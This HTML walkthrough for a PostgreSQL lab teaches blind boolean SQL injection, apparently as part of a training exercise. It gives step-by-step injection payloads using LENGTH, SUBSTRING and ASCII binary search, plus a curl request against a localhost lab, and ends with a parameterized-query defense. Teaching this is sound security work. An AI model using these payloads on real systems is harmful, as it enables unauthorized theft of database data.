<h4>Step 1: Confirm the Boolean Oracle</h4>
<p>
    The page returns two distinct responses: <strong>"Active"</strong> or <strong>"Not found"</strong>.
    Test with a known member and a non-existent one.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Test Oracle</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>alice<br>
        <span class="prompt">SQL&gt; </span>SELECT username, is_active FROM members WHERE username = 'alice' AND is_active = true<br>
        <span class="prompt">Response: </span><strong>Status: Active</strong><br><br>
        <span class="prompt">Input: </span>nonexistent<br>
        <span class="prompt">Response: </span><strong>Status: Not found</strong>
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<p>
    Inject always-true and always-false conditions to confirm the boolean oracle works with injection.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Confirm Injection</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>alice' AND 1=1 -- -<br>
        <span class="prompt">Response: </span><strong>Status: Active</strong> (TRUE -- injection works)<br><br>
        <span class="prompt">Input: </span>alice' AND 1=2 -- -<br>
        <span class="prompt">Response: </span><strong>Status: Not found</strong> (FALSE -- condition forced false)
    </div>
</div>

<h4>Step 3: Determine the Secret Length</h4>
<p>
    Use <code>LENGTH()</code> with binary search to find the secret's length.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Find Secret Length</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>alice' AND (SELECT LENGTH(secret_value) FROM secrets LIMIT 1) > 20 -- -<br>
        <span class="prompt">Response: </span>Active (TRUE -- length > 20)<br><br>
        <span class="prompt">Input: </span>alice' AND (SELECT LENGTH(secret_value) FROM secrets LIMIT 1) > 25 -- -<br>
        <span class="prompt">Response: </span>Not found (FALSE -- length <= 25)<br><br>
        <span class="prompt">Input: </span>alice' AND (SELECT LENGTH(secret_value) FROM secrets LIMIT 1) = 24 -- -<br>
        <span class="prompt">Response: </span><strong>Active</strong> (TRUE -- secret is exactly 24 characters)
    </div>
</div>

<h4>Step 4: Extract Characters with SUBSTRING</h4>
<p>
    Use <code>SUBSTRING(string, position, length)</code> to test each character position.
    PostgreSQL's <code>SUBSTRING()</code> is 1-indexed.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Extract Character by Character</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Char 1: </span>alice' AND SUBSTRING((SELECT secret_value FROM secrets LIMIT 1),1,1)='F' -- -<br>
        <span class="prompt">Response: </span>Active (TRUE -- first char is 'F')<br><br>
        <span class="prompt">Char 2: </span>alice' AND SUBSTRING((SELECT secret_value FROM secrets LIMIT 1),2,1)='L' -- -<br>
        <span class="prompt">Response: </span>Active (TRUE -- second char is 'L')<br><br>
        <span class="prompt">Char 5: </span>alice' AND SUBSTRING((SELECT secret_value FROM secrets LIMIT 1),5,1)='{' -- -<br>
        <span class="prompt">Response: </span>Active (TRUE -- fifth char is '{')
    </div>
</div>

<p>So far we have: <code>FLAG{...</code></p>

<h4>Step 5: Optimize with ASCII + Binary Search</h4>
<p>
    Testing every character is slow (~40 attempts per position). Use <code>ASCII()</code> with
    binary search to narrow down each character in ~7 queries. Unlike MySQL, PostgreSQL's string
    comparison is <strong>case-sensitive</strong> by default, but ASCII binary search is still faster.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Binary Search with ASCII</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Finding char at position 1 (expected: 'F' = ASCII 70)</span><br><br>
        <span class="prompt">Input: </span>alice' AND ASCII(SUBSTRING((SELECT secret_value FROM secrets LIMIT 1),1,1)) > 70 -- -<br>
        <span class="prompt">Response: </span>Not found (FALSE -- ASCII <= 70)<br><br>
        <span class="prompt">Input: </span>alice' AND ASCII(SUBSTRING((SELECT secret_value FROM secrets LIMIT 1),1,1)) = 70 -- -<br>
        <span class="prompt">Response: </span><strong>Active</strong> (TRUE -- ASCII 70 = 'F')
    </div>
</div>

<h4>Step 6: Full Extraction</h4>
<p>
    Repeat the binary search for all 24 positions. Here is the complete flag:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Complete Flag</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Position: </span> 1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22 23 24<br>
        <span class="prompt">Char:     </span> F  L  A  G  {  p  g  _  b  l  1  n  d  _  b  0  0  l  _  c  4  s  3  }<br><br>
        <span class="prompt">Flag: </span><strong>FLAG{pg_bl1nd_b00l_c4s3}</strong>
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{pg_bl1nd_b00l_c4s3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Manual Single-Character Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab4" \<br> --data-urlencode "member=alice' AND ASCII(SUBSTRING((SELECT secret_value FROM secrets LIMIT 1),1,1)) = 70 -- -"<br><br>
        <span class="prompt"># </span>ASCII 70 = 'F' -- returns "Status: Active" (TRUE)<br>
        <span class="prompt">Output:</span> Status: Active
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Blind boolean SQL injection works even when no data or errors are
    returned. The application's binary response (Active/Not found) serves as a single-bit oracle.
    By testing one character position at a time with <code>SUBSTRING()</code>, the entire secret can
    be extracted. PostgreSQL's <code>SUBSTRING()</code> is 1-indexed and its string comparison is
    case-sensitive by default (unlike MySQL). Defense: use parameterized queries with
    <code>pg_query_params($conn, 'SELECT ... WHERE username = $1', array($input))</code>.
</div>
